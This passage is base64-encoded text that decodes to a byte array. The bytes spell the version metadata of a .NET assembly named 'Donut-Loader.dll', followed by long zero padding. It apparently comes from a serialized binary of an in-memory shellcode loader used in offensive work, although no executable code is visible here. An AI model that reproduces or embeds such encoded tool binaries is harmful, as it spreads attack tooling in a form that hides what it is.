sIDAsIDEsIDAsIDgzLCAwLCAxMTYsIDAsIDExNCwgMCwgMTA1LCAwLCAxMTAsIDAsIDEwMywgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDczLCAwLCAxMTAsIDAsIDEwMiwgMCwgMTExLCAwLCAwLCAwLCA1NiwgMiwgMCwgMCwgMSwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA1MiwgMCwgOTgsIDAsIDQ4LCAwLCAwLCAwLCA2OCwgMCwgMTMsIDAsIDEsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA2OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDk5LCAwLCAxMTQsIDAsIDEwNSwgMCwgMTEyLCAwLCAxMTYsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAxMTEsIDAsIDExMCwgMCwgMTE3LCAwLCAxMTYsIDAsIDQ1LCAwLCA3NiwgMCwgMTExLCAwLCA5NywgMCwgMTAwLCAwLCAxMDEsIDAsIDExNCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDE1LCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNTAsIDAsIDQ4LCAwLCA1NSwgMCwgNDYsIDAsIDUwLCAwLCA0OCwgMCwgNTMsIDAsIDQ4LCAwLCA1NiwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDE3LCAwLCAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMTYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTAsIDAsIDk3LCAwLCAxMDgsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDY4LCAwLCAxMTEsIDAsIDExMCwgMCwgMTE3LCAwLCAxMTYsIDAsIDQ1LCAwLCA3NiwgMCwgMTExLCAwLCA5NywgMCwgMTAwLCAwLCAxMDEsIDAsIDExNCwgMCwgNDYsIDAsIDEwMCwgMCwgMTA4LCAwLCAxMDgsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAxNSwgMCwgMSwgMCwgNzYsIDAsIDEwMSwgMCwgMTAzLCAwLCA5NywgMCwgMTA4LCAwLCA2NywgMCwgMTExLCAwLCAxMTIsIDAsIDEyMSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA0LCAwLCAxMTYsIDAsIDAsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMzIsIDAsIDUwLCAwLCA0OCwgMCwgNDksIDAsIDU3LCAwLCAwLCAwLCAwLCAwLCA3NiwgMCwgMTcsIDAsIDEsIDAsIDc5LCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDUsIDAsIDExMCwgMCwgOTcsIDAsIDEwOCwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDExMCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCA2OCwgMCwgMTExLCAwLCAxMTAsIDAsIDExNywgMCwgMTE2LCAwLCA0NSwgMCwgNzYsIDAsIDExMSwgMCwgOTcsIDAsIDEwMCwgMCwgMTAxLCAwLCAxMTQsIDAsIDQ2LCAwLCAxMDAsIDAsIDEwOCwgMCwgMTA4LCAwLCAwLCAwLCAwLCAwLCA2MCwgMCwgMTMsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAxMTEsIDAsIDExMCwgMCwgMTE3LCAwLCAxMTYsIDAsIDQ1LCAwLCA3NiwgMCwgMTExLCAwLCA5NywgMCwgMTAwLCAwLCAxMDEsIDAsIDExNCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA4MCwgMCwgMTE0LCAwLCAxMTEsIDAsIDEwMCwgMCwgMTE3LCAwLCA5OSwgMCwgMTE2LCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA1MCwgMCwgNDgsIDAsIDU1LCAwLCA0NiwgMCwgNTAsIDAsIDQ4LCAwLCA1MywgMCwgNDgsIDAsIDU2LCAwLCAwLCAwLCAwLCAwLCA3MiwgMCwgMTUsIDAsIDEsIDAsIDY1LCAwLCAxMTUsIDAsIDExNSwgMCwgMTAxLCAwLCAxMDksIDAsIDk4LCAwLCAxMDgsIDAsIDEyMSwgMCwgMzIsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDUwLCAwLCA0OCwgMCwgNTUsIDAsIDQ2LCAwLCA1MCwgMCwgNDgsIDAsIDUzLCAwLCA0OCwgMCwgNTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAs